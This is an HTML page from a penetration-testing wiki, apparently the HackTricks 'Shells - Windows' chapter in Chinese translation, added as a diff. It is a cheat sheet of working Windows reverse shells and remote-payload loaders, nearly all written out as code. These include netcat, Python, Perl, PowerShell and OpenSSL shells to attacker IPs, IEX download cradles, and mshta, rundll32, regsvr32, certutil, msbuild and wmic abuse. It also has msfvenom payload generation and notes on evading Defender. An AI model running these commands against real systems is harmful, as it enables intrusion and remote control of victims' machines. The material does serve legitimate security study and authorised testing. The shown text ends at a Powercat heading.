@@ -1,0 +1,587 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Reverse Shells - Windows</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="shells---windows"><a class="header" href="#shells---windows">Shells - Windows</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="lolbas"><a class="header" href="#lolbas">Lolbas</a></h2>
+<p>页面 <a href="https://lolbas-project.github.io/">lolbas-project.github.io</a> 针对 Windows，就像 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 针对 Linux。<br />
+显然，<strong>Windows 中没有 SUID 文件或 sudo 权限</strong>，但了解 <strong>如何</strong> 一些 <strong>二进制文件</strong> 可以被 (滥) 用于执行某种意外操作，如 <strong>执行任意代码</strong>，是很有用的。</p>
+<h2 id="nc"><a class="header" href="#nc">NC</a></h2>
+<pre><code class="language-bash">nc.exe -e cmd.exe &lt;Attacker_IP&gt; &lt;PORT&gt;
+</code></pre>
+<h2 id="ncat"><a class="header" href="#ncat">NCAT</a></h2>
+<p>受害者</p>
+<pre><code>ncat.exe &lt;Attacker_IP&gt; &lt;PORT&gt;  -e "cmd.exe /c (cmd.exe  2&gt;&amp;1)"
+#Encryption to bypass firewall
+ncat.exe &lt;Attacker_IP&gt; &lt;PORT eg.443&gt; --ssl -e "cmd.exe /c (cmd.exe  2&gt;&amp;1)"
+</code></pre>
+<p>攻击者</p>
+<pre><code>ncat -l &lt;PORT&gt;
+#Encryption to bypass firewall
+ncat -l &lt;PORT eg.443&gt; --ssl
+</code></pre>
+<h2 id="sbd"><a class="header" href="#sbd">SBD</a></h2>
+<p><strong><a href="https://www.kali.org/tools/sbd/">sbd</a> 是一个便携且安全的 Netcat 替代品</strong>。它在类 Unix 系统和 Win32 上运行。具有强加密、程序执行、可自定义源端口和持续重连等功能，sbd 为 TCP/IP 通信提供了多功能解决方案。对于 Windows 用户，可以使用 Kali Linux 发行版中的 sbd.exe 版本作为 Netcat 的可靠替代品。</p>
+<pre><code class="language-bash"># Victims machine
+sbd -l -p 4444 -e bash -v -n
+listening on port 4444
+
+
+# Atackers
+sbd 10.10.10.10 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h2 id="python"><a class="header" href="#python">Python</a></h2>
+<pre><code class="language-bash">#Windows
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+</code></pre>
+<h2 id="perl"><a class="header" href="#perl">Perl</a></h2>
+<pre><code class="language-bash">perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+<h2 id="ruby"><a class="header" href="#ruby">Ruby</a></h2>
+<pre><code class="language-bash">#Windows
+ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+</code></pre>
+<h2 id="lua"><a class="header" href="#lua">Lua</a></h2>
+<pre><code class="language-bash">lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+</code></pre>
+<h2 id="openssh"><a class="header" href="#openssh">OpenSSH</a></h2>
+<p>攻击者 (Kali)</p>
+<pre><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port&gt; #Here you will be able to introduce the commands
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; #Here yo will be able to get the response
+</code></pre>
+<p>受害者</p>
+<pre><code class="language-bash">#Linux
+openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;|/bin/bash|openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
+
+#Windows
+openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;|cmd.exe|openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
+</code></pre>
+<h2 id="powershell"><a class="header" href="#powershell">Powershell</a></h2>
+<pre><code class="language-bash">powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
+Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
+</code></pre>
+<p>执行网络调用的进程：<strong>powershell.exe</strong><br />
+写入磁盘的有效负载：<strong>没有</strong>（<em>至少在我使用procmon时找不到！</em>）</p>
+<pre><code class="language-bash">powershell -exec bypass -f \\webdavserver\folder\payload.ps1
+</code></pre>
+<p>执行网络调用的进程：<strong>svchost.exe</strong><br />
+写入磁盘的有效载荷：<strong>WebDAV 客户端本地缓存</strong></p>
+<p><strong>一行代码：</strong></p>
+<pre><code class="language-bash">$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre>
+<p><strong>在本文档末尾获取有关不同Powershell Shell的更多信息</strong></p>
+<h2 id="mshta"><a class="header" href="#mshta">Mshta</a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<pre><code class="language-bash">mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+</code></pre>
+<pre><code class="language-bash">mshta http://webserver/payload.hta
+</code></pre>
+<pre><code class="language-bash">mshta \\webdavserver\folder\payload.hta
+</code></pre>
+<h4 id="hta-psh-反向-shell-示例使用-hta-下载并执行-ps-后门"><a class="header" href="#hta-psh-反向-shell-示例使用-hta-下载并执行-ps-后门"><strong>hta-psh 反向 shell 示例（使用 hta 下载并执行 PS 后门）</strong></a></h4>
+<pre><code class="language-xml">&lt;scRipt language="VBscRipT"&gt;CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"&lt;/scRipt&gt;
+</code></pre>
+<p><strong>您可以通过 stager hta 非常轻松地下载和执行 Koadic 僵尸</strong></p>
+<h4 id="hta-示例"><a class="header" href="#hta-示例">hta 示例</a></h4>
+<p><a href="https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f"><strong>从这里</strong></a></p>
+<pre><code class="language-xml">&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION ID="HelloExample"&gt;
+&lt;script language="jscript"&gt;
+var c = "cmd.exe /c calc.exe";
+new ActiveXObject('WScript.Shell').Run(c);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;self.close();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h4 id="mshta---sct"><a class="header" href="#mshta---sct"><strong>mshta - sct</strong></a></h4>
+<p><a href="https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17"><strong>来自这里</strong></a></p>
+<pre><code class="language-xml">&lt;?XML version="1.0"?&gt;
+&lt;!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  --&gt;
+&lt;!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) --&gt;
+&lt;!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) --&gt;
+&lt;scriptlet&gt;
+&lt;public&gt;
+&lt;/public&gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]&gt;
+&lt;/script&gt;
+&lt;/scriptlet&gt;
+</code></pre>
+<h4 id="mshta---metasploit"><a class="header" href="#mshta---metasploit"><strong>Mshta - Metasploit</strong></a></h4>
+<pre><code class="language-bash">use exploit/windows/misc/hta_server
+msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109
+msf exploit(windows/misc/hta_server) &gt; set lhost 192.168.1.109
+msf exploit(windows/misc/hta_server) &gt; exploit
+</code></pre>
+<pre><code class="language-bash">Victim&gt; mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
+</code></pre>
+<p><strong>被防御者检测到</strong></p>
+<h2 id="rundll32"><a class="header" href="#rundll32"><strong>Rundll32</strong></a></h2>
+<p><a href="https://github.com/carterjones/hello-world-dll"><strong>Dll hello world 示例</strong></a></p>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">来自这里</a></li>
+</ul>
+<pre><code class="language-bash">rundll32 \\webdavserver\folder\payload.dll,entrypoint
+</code></pre>
+<pre><code class="language-bash">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+</code></pre>
+<p><strong>被防御者检测到</strong></p>
+<p><strong>Rundll32 - sct</strong></p>
+<p><a href="https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17"><strong>从这里</strong></a></p>
+<pre><code class="language-xml">&lt;?XML version="1.0"?&gt;
+&lt;!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  --&gt;
+&lt;!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) --&gt;
+&lt;scriptlet&gt;
+&lt;public&gt;
+&lt;/public&gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]&gt;
+&lt;/script&gt;
+&lt;/scriptlet&gt;
+</code></pre>
+<h4 id="rundll32---metasploit"><a class="header" href="#rundll32---metasploit"><strong>Rundll32 - Metasploit</strong></a></h4>
+<pre><code class="language-bash">use windows/smb/smb_delivery
+run
+#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
+</code></pre>
+<p><strong>Rundll32 - Koadic</strong></p>
+<pre><code class="language-bash">use stager/js/rundll32_js
+set SRVHOST 192.168.1.107
+set ENDPOINT sales
+run
+#Koadic will tell you what you need to execute inside the victim, it will be something like:
+rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
+</code></pre>
+<h2 id="regsvr32"><a class="header" href="#regsvr32">Regsvr32</a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<pre><code class="language-bash">regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+</code></pre>
+<pre><code>regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
+</code></pre>
+<p><strong>被防御者检测到</strong></p>
+<h4 id="regsvr32--sct"><a class="header" href="#regsvr32--sct">Regsvr32 -sct</a></h4>
+<p><a href="https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1"><strong>从这里</strong></a></p>
+<pre><code class="language-markup">&lt;?XML version="1.0"?&gt;
+&lt;!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll --&gt;
+&lt;!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll --&gt;
+&lt;scriptlet&gt;
+&lt;registration
+progid="PoC"
+classid="{10001111-0000-0000-0000-0000FEEDACDC}" &gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre>
+<h4 id="regsvr32---metasploit"><a class="header" href="#regsvr32---metasploit"><strong>Regsvr32 - Metasploit</strong></a></h4>
+<pre><code class="language-bash">use multi/script/web_delivery
+set target 3
+set payload windows/meterpreter/reverse/tcp
+set lhost 10.2.0.5
+run
+#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
+</code></pre>
+<p><strong>您可以使用 stager regsvr 非常轻松地下载和执行 Koadic 僵尸</strong></p>
+<h2 id="certutil"><a class="header" href="#certutil">Certutil</a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<p>下载一个 B64dll，解码并执行它。</p>
+<pre><code class="language-bash">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+</code></pre>
+<p>下载一个 B64exe，解码并执行它。</p>
+<pre><code class="language-bash">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe
+</code></pre>
+<p><strong>被防御者检测到</strong></p>
+<h2 id="cscriptwscript"><a class="header" href="#cscriptwscript"><strong>Cscript/Wscript</strong></a></h2>
+<pre><code class="language-bash">powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+</code></pre>
+<p><strong>Cscript - Metasploit</strong></p>
+<pre><code class="language-bash">msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs &gt; shell.vbs
+</code></pre>
+<p><strong>被防御者检测到</strong></p>
+<h2 id="ps-bat"><a class="header" href="#ps-bat">PS-Bat</a></h2>
+<pre><code class="language-bash">\\webdavserver\folder\batchfile.bat
+</code></pre>
+<p>执行网络调用的进程：<strong>svchost.exe</strong><br />
+写入磁盘的有效载荷：<strong>WebDAV 客户端本地缓存</strong></p>
+<pre><code class="language-bash">msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 &gt; shell.bat
+impacket-smbserver -smb2support kali `pwd`
+</code></pre>
+<pre><code class="language-bash">\\10.8.0.3\kali\shell.bat
+</code></pre>
+<p><strong>被防御者检测到</strong></p>
+<h2 id="msiexec"><a class="header" href="#msiexec"><strong>MSIExec</strong></a></h2>
+<p>攻击者</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi &gt; shell.msi
+python -m SimpleHTTPServer 80
+</code></pre>
+<p>受害者：</p>
+<pre><code>victim&gt; msiexec /quiet /i \\10.2.0.5\kali\shell.msi
+</code></pre>
+<p><strong>检测到</strong></p>
+<h2 id="wmic"><a class="header" href="#wmic"><strong>Wmic</strong></a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<pre><code class="language-bash">wmic os get /format:"https://webserver/payload.xsl"
+</code></pre>
+<p>示例 xsl 文件 <a href="https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7">来自这里</a>:</p>
+<pre><code class="language-xml">&lt;?xml version='1.0'?&gt;
+&lt;stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0"&gt;
+&lt;output method="text"/&gt;
+&lt;ms:script implements-prefix="user" language="JScript"&gt;
+&lt;![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
+]]&gt;
+&lt;/ms:script&gt;
+&lt;/stylesheet&gt;
+</code></pre>
+<p><strong>未被检测</strong></p>
+<p><strong>您可以使用 stager wmic 非常轻松地下载并执行 Koadic 僵尸</strong></p>
+<h2 id="msbuild"><a class="header" href="#msbuild">Msbuild</a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<pre><code>cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml"
+</code></pre>
+<p>您可以使用此技术绕过应用程序白名单和 Powershell.exe 限制。您将会看到一个 PS shell。<br />
+只需下载并执行此文件： <a href="https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj">https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj</a></p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
+</code></pre>
+<p><strong>未检测到</strong></p>
+<h2 id="csc"><a class="header" href="#csc"><strong>CSC</strong></a></h2>
+<p>在受害者机器上编译 C# 代码。</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
+</code></pre>
+<p>您可以从这里下载一个基本的 C# 反向 shell: <a href="https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc">https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc</a></p>
+<p><strong>未被检测</strong></p>
+<h2 id="regasmregsvc"><a class="header" href="#regasmregsvc"><strong>Regasm/Regsvc</strong></a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
+</code></pre>
+<p><strong>我还没有尝试过</strong></p>
+<p><a href="https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182"><strong>https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182</strong></a></p>
+<h2 id="odbcconf"><a class="header" href="#odbcconf">Odbcconf</a></h2>
+<ul>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">从这里</a></li>
+</ul>
+<pre><code class="language-bash">odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
+</code></pre>
+<p><strong>我还没有尝试过</strong></p>
+<p><a href="https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2"><strong>https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2</strong></a></p>
+<h2 id="powershell-shells"><a class="header" href="#powershell-shells">Powershell Shells</a></h2>
+<h3 id="ps-nishang"><a class="header" href="#ps-nishang">PS-Nishang</a></h3>
+<p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<p>在<strong>Shells</strong>文件夹中，有许多不同的shell。要下载并执行Invoke-<em>PowerShellTcp.ps1</em>，请复制脚本并将其附加到文件末尾：</p>
+<pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
+</code></pre>
+<p>在网络服务器上启动脚本并在受害者端执行：</p>
+<pre><code>powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
+</code></pre>
+<p>Defender 尚未将其检测为恶意代码（截至 2019 年 3 月 4 日）。</p>
+<p><strong>TODO: 检查其他 nishang shells</strong></p>
+<h3 id="ps-powercat"><a class="header" href="#ps-powercat"><strong>PS-Powercat</strong></a></h3>
